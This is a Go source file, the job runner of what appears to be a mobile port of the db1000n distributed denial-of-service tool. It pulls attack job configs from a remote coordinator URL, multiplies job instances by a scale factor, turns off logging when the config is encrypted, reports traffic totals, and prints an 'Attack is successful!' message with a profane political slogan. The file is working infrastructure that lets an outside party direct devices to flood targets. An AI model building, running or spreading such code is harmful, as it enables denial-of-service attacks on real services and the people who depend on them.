// MIT License

// Copyright (c) [2022] [Bohdan Ivashko (https://github.com/Arriven)]

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

// Package runner [responsible for updating the config and managing jobs accordingly]
package runner

import (
	"bytes"
	"context"
	"flag"
	"os"
	"strings"
	"text/tabwriter"
	"time"

	"go.uber.org/zap"

	"github.com/zlaya-sobaka/db1000n_mobile/src/jobs"
	"github.com/zlaya-sobaka/db1000n_mobile/src/mobilelogger"
	"github.com/zlaya-sobaka/db1000n_mobile/src/runner/config"
	"github.com/zlaya-sobaka/db1000n_mobile/src/utils"
	"github.com/zlaya-sobaka/db1000n_mobile/src/utils/metrics"
	"github.com/zlaya-sobaka/db1000n_mobile/src/utils/templates"
)

// ConfigOptions for fetching job configs for the runner
type ConfigOptions struct {
	PathsCSV       string        // Comma-separated config location URLs
	BackupConfig   string        // Raw backup config
	Format         string        // json or yaml
	RefreshTimeout time.Duration // How often to refresh config
}

// NewConfigOptionsWithFlags returns ConfigOptions initialized with command line flags.
func NewConfigOptionsWithFlags() *ConfigOptions {
	var res ConfigOptions

	flag.StringVar(&res.PathsCSV, "c",
		utils.GetEnvStringDefault("CONFIG", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json"),
		"path to config files, separated by a comma, each path can be a web endpoint")
	flag.StringVar(&res.BackupConfig, "b", config.DefaultConfig, "raw backup config in case the primary one is unavailable")
	flag.StringVar(&res.Format, "format", utils.GetEnvStringDefault("CONFIG_FORMAT", "yaml"), "config format")
	flag.DurationVar(&res.RefreshTimeout, "refresh-interval", utils.GetEnvDurationDefault("REFRESH_INTERVAL", time.Minute),
		"refresh timeout for updating the config")

	return &res
}

// Runner executes jobs according to the (fetched from remote) configuration
type Runner struct {
	cfgOptions    *ConfigOptions
	globalJobsCfg *jobs.GlobalConfig
}

// New runner according to the config
func New(cfgOptions *ConfigOptions, globalJobsCfg *jobs.GlobalConfig) (*Runner, error) {
	return &Runner{
		cfgOptions:    cfgOptions,
		globalJobsCfg: globalJobsCfg,
	}, nil
}

// Run the runner and block until Stop() is called
func (r *Runner) Run(ctx context.Context, logger *zap.Logger) {
	ctx = context.WithValue(ctx, templates.ContextKey("global"), r.globalJobsCfg)

	metrics.IncClient()

	refreshTimer := time.NewTicker(r.cfgOptions.RefreshTimeout)

	defer refreshTimer.Stop()

	var cancel context.CancelFunc

	lastKnownConfig := &config.RawConfig{}

	for {
		rawConfig := config.FetchRawConfig(strings.Split(r.cfgOptions.PathsCSV, ","),
			nonNilConfigOrDefault(lastKnownConfig, &config.RawConfig{Body: []byte(r.cfgOptions.BackupConfig)}))
		cfg := config.Unmarshal(rawConfig.Body, r.cfgOptions.Format)

		if !bytes.Equal(lastKnownConfig.Body, rawConfig.Body) && cfg != nil { // Only restart jobs if the new config differs from the current one
			mobilelogger.Infof("New config received, applying")

			lastKnownConfig = rawConfig

			if cancel != nil {
				cancel()
			}

			if rawConfig.Encrypted {
				mobilelogger.Infof("Config is encrypted, disabling logs")

				cancel = r.runJobs(jobs.EncryptedContext(ctx), zap.NewNop(), cfg)
			} else {
				cancel = r.runJobs(ctx, logger, cfg)
			}
		} else {
			mobilelogger.Infof("The config has not changed. Keep calm and carry on!")
		}

		// Wait for refresh timer or stop signal
		select {
		case <-refreshTimer.C:
		case <-ctx.Done():
			if cancel != nil {
				cancel()
			}

			return
		}

		if err := dumpMetrics(r.globalJobsCfg.ClientID); err != nil {
			logger.Debug("error reporting statistics", zap.Error(err))
		}
	}
}

func nonNilConfigOrDefault(c, defaultConfig *config.RawConfig) *config.RawConfig {
	if c.Body != nil {
		return c
	}

	return defaultConfig
}

func (r *Runner) runJobs(ctx context.Context, logger *zap.Logger, cfg *config.Config) (cancel context.CancelFunc) {
	ctx, cancel = context.WithCancel(ctx)

	var jobInstancesCount int

	for i := range cfg.Jobs {
		if len(cfg.Jobs[i].Filter) != 0 && strings.TrimSpace(templates.ParseAndExecute(logger, cfg.Jobs[i].Filter, ctx)) != "true" {
			logger.Info("There is a filter defined for a job but this client doesn't pass it - skip the job")

			continue
		}

		job := jobs.Get(cfg.Jobs[i].Type)
		if job == nil {
			logger.Error("unknown job", zap.String("type", cfg.Jobs[i].Type))

			continue
		}

		if cfg.Jobs[i].Count < 1 {
			cfg.Jobs[i].Count = 1
		}

		if r.globalJobsCfg.ScaleFactor > 0 {
			cfg.Jobs[i].Count *= r.globalJobsCfg.ScaleFactor
		}

		cfgMap := make(map[string]interface{})
		if err := utils.Decode(cfg.Jobs[i], &cfgMap); err != nil {
			logger.Fatal("failed to encode cfg map")
		}

		ctx := context.WithValue(ctx, templates.ContextKey("config"), cfgMap)

		for j := 0; j < cfg.Jobs[i].Count; j++ {
			go func(i int) {
				defer utils.PanicHandler(logger)

				_, err := job(ctx, logger, r.globalJobsCfg, cfg.Jobs[i].Args)
				if err != nil {
					logger.Error("error running job",
						zap.String("name", cfg.Jobs[i].Name),
						zap.String("type", cfg.Jobs[i].Type),
						zap.Error(err))
				}
			}(i)

			jobInstancesCount++
		}
	}

	mobilelogger.Infof("%d job instances (re)started", jobInstancesCount)

	return cancel
}

func dumpMetrics(clientID string) error {
	defer func() {
		if err := recover(); err != nil {
			mobilelogger.Infof("caught panic: %v", err)
		}
	}()

	bytesGenerated := metrics.Default.Read(metrics.Traffic)
	bytesProcessed := metrics.Default.Read(metrics.ProcessedTraffic)

	if err := utils.ReportStatistics(int64(bytesGenerated), clientID); err != nil {
		return err
	}

	networkStatsWriter := tabwriter.NewWriter(os.Stdout, 1, 1, 1, ' ', tabwriter.AlignRight)

	if bytesGenerated > 0 {
		mobilelogger.Infof("\n\n!Атака проводиться успішно! Русскій воєнний корабль іди нахуй!")
		mobilelogger.Infof("!Attack is successful! Russian warship, go fuck yourself!")

		const BytesInMegabytes = 1024 * 1024
		megabytesGenerated := float64(bytesGenerated) / BytesInMegabytes
		megabytesProcessed := float64(bytesProcessed) / BytesInMegabytes

		const PercentConversionMultilpier = 100
		responsePercent := float64(bytesProcessed) / float64(bytesGenerated) * PercentConversionMultilpier

		mobilelogger.Infof("---------Traffic stats---------\n")
		mobilelogger.Infof("[\tGenerated\t]\t%.2f\tMB\t|\t%v \tbytes\n", megabytesGenerated, bytesGenerated)
		mobilelogger.Infof("[\tReceived\t]\t%.2f\tMB\t|\t%v \tbytes\n", megabytesProcessed, bytesProcessed)
		mobilelogger.Infof("[\tResponse rate\t]\t%.1f\t%%\n", responsePercent)
		mobilelogger.Infof("-------------------------------\n\n")
	} else {
		mobilelogger.Infof("[Error] No traffic generated. If you see this message a lot - contact admins")
	}

	networkStatsWriter.Flush()

	return nil
}
